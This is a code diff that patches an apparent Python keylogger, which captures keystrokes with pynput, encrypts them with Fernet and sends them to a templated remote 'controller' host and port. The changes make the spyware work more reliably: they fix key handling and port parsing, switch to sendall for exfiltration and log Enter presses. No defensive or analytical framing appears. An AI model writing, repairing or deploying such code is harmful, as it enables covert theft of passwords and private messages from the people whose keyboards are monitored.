@@ -6,7 +6,7 @@ from pynput import keyboard
 from cryptography.fernet import Fernet
 
 KEY = 'RANDOM_KEY'
-fernet = Fernet(KEY)
+fernet = Fernet(KEY.encode() if isinstance(KEY, str) else KEY)
 
 parser = argparse.ArgumentParser(add_help=False)
 parser.add_argument('--controller-host', dest='controller_host', default=None)
@@ -14,7 +14,8 @@ parser.add_argument('--controller-port', dest='controller_port', type=int, defau
 args, _ = parser.parse_known_args()
 
 HOST = args.controller_host if args.controller_host else "__ipaddr__"
-PORT = args.controller_port if args.controller_port else 12345
+DEFAULT_PORT = "__controller_port__"
+PORT = args.controller_port if args.controller_port else int(DEFAULT_PORT) if str(DEFAULT_PORT).isdigit() else None
 
 payloads = []
 counter = 0
@@ -31,8 +32,8 @@ def send_data(conn, data: bytes):
     global s
     enc = encrypt(data)
     try:
-        conn.send(struct.pack('>I', len(enc)))
-        conn.send(enc)
+        conn.sendall(struct.pack('>I', len(enc)))
+        conn.sendall(enc)
     except Exception as e:
         print("[-] Connection established failed (send_data()) " + str(e))
         s = None
@@ -54,6 +55,7 @@ def control(conn, key):
     text = ""
     if key == keyboard.Key.enter:
         text = "\n"
+        payloads.append(text)
     elif key == keyboard.Key.backspace:
         if payloads:
             payloads.pop()
